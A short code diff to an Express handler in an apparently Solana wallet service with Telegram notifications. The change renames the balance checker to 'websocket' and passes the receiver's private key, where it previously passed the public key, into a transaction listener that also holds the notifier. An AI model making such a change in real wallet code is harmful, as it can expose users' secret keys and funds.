@@ -95,7 +95,7 @@ app.post('/api/create', async (req, res) => {
         if (typeof receiverPrivateKey !== 'string') {
             throw new TypeError('Receiver private key must be a string');
         }
-        const balanceChecker = new BalanceChecker(
+        const websocket = new BalanceChecker(
             [process.env.SOLANA_RPC_ENDPOINT_1, process.env.SOLANA_RPC_ENDPOINT_2],
             [process.env.SOLANA_WEBSOCKET_1, process.env.SOLANA_WEBSOCKET_2],
             telegramNotifier,
@@ -103,7 +103,7 @@ app.post('/api/create', async (req, res) => {
         );
 
         if (!userData?.walletsCreated) {
-            balanceChecker.listenForTransactions(chatId, receiverPublicKey.toString(), minimumSolBalance, minimumTokenBalance, tokenMintAddress);
+            websocket.listenForTransactions(chatId, receiverPrivateKey, minimumSolBalance, minimumTokenBalance);
             telegramNotifier.sendTelegramMessage(chatId, `🔍 Waiting for ${minimumSolBalance} SOL to be confirmed...`);
             res.status(200).send('Checking balance...');
         } else if (userData?.walletsCreated && !userData.distributeSolana) {
